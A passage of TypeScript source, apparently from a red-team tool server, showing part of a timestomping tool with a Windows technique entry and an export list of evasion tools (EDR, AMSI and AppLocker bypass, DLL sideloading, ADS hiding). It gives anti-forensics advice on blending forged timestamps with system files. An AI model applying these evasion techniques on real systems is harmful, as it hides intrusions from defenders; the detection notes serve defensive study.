        detection_notes: "Endpoint security logging. Birth time (btime) preserved in APFS metadata.",
      },
      {
        technique: "NtSetInformationFile Timestamp (Windows API)",
        description: "Use NtSetInformationFile API to modify both $SI and $FN timestamps, more thorough than PowerShell method",
        platform: "windows",
        binary: "powershell.exe",
        command: "Invoke compiled C# or P/Invoke code using NtSetInformationFile with FileBasicInformation class",
        cleanup_command: "N/A — requires MFT forensics to detect",
        stealth_score: 1,
        attck_ids: ["T1070.006"],
        prerequisites: ["Write access to the target file", "Ability to run .NET code"],
        detection_notes: "Very difficult to detect. MFT journal analysis may reveal anomalies. USN journal entries.",
      },
    ];

    const filtered = techniques.filter(t => t.platform === platform);

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      sessionContext = {
        environment_id: session.id,
        privilege_level: session.state.privilegeLevel,
        recommendations: "Timestomping works at user level for owned files. Match timestamps with nearby legitimate system files for better blending.",
      };
    }

    return json({
      platform,
      total_techniques: filtered.length,
      techniques: filtered,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── Export ─────────────────────────────────────────────────────────────────────

export const evasionTools: ToolDef[] = [
  evasion_bypass_edr,
  evasion_amsi_bypass,
  evasion_applocker,
  evasion_obfuscate,
  evasion_dll_sideload,
  evasion_driver_load,
  evasion_ads_hide,
  evasion_timestomp,
];
